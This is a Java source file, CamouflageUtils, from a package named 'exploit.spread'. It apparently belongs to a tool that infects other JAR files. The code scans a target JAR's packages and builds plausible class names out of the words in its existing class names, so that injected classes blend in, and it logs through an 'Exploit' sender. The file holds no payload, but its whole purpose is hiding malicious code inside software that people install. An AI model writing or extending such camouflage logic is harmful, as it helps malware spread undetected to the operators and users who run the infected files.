package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;

import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.logging.Level;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public final class CamouflageUtils {
    public record CamouflagePlan(String packageName, String namePrefix) {}
    private static final Random RANDOM = new Random();
    private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

    public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
        Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);
        if (packageStructure.isEmpty()) {
            return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
        }
        List<Map.Entry<String, List<String>>> packagesSorted = packageStructure.entrySet().stream()
            .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
            .sorted(Comparator.comparingInt(e -> e.getValue().size() * -1))
            .collect(Collectors.toList());

        if (packagesSorted.isEmpty()) {
            return new CamouflagePlan("com/tmquan2508/internal/fallback", "Task");
        }

        Map.Entry<String, List<String>> chosenEntry = packagesSorted.get(RANDOM.nextInt(Math.min(3, packagesSorted.size())));
        String chosenPackagePath = chosenEntry.getKey();
        List<String> classNamesInPackage = chosenEntry.getValue();
        List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);

        if (dictionary.isEmpty()) {
            return new CamouflagePlan(chosenPackagePath, "Core");
        }

        List<String> simpleNames = classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList());
        String namePrefix = buildUniqueWordName(dictionary, simpleNames, 1, 2);

        return new CamouflagePlan(chosenPackagePath, namePrefix);
    }

    private static List<String> buildWordDictionaryFrom(List<String> classNames) {
        return classNames.stream()
            .map(className -> className.substring(0, className.lastIndexOf('.')))
            .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
            .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
            .filter(word -> word.length() > 2)
            .distinct()
            .collect(Collectors.toList());
    }

    private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
        String name;
        int attempts = 0;
        do {
            int wordCount = minWords + (maxWords > minWords ? RANDOM.nextInt(maxWords - minWords + 1) : 0);
            StringBuilder nameBuilder = new StringBuilder();
            for (int i = 0; i < wordCount; i++) {
                String word = dictionary.get(RANDOM.nextInt(dictionary.size()));
                nameBuilder.append(Character.toUpperCase(word.charAt(0))).append(word.substring(1).toLowerCase());
            }
            name = nameBuilder.toString();
            if (attempts > 10) name += attempts;
            attempts++;
        } while (name.isEmpty() || existingNames.contains(name));
        return name;
    }

    private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
        Map<String, List<String>> packageMap = new HashMap<>();
        try (ZipFile zipFile = new ZipFile(jarFile)) {
            Enumeration<? extends ZipEntry> entries = zipFile.entries();
            while (entries.hasMoreElements()) {
                ZipEntry entry = entries.nextElement();
                if (entry.isDirectory() || !entry.getName().endsWith(".class") || entry.getName().contains("$"))
                    continue;
                String fullPath = entry.getName();
                int lastSlash = fullPath.lastIndexOf('/');
                String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
            }
        } catch (IOException e) {
            Exploit.sender.sendDebug(Level.WARNING, "[Camouflage] Error scanning JAR file: " + e.getMessage());
        }
        return packageMap;
    }
}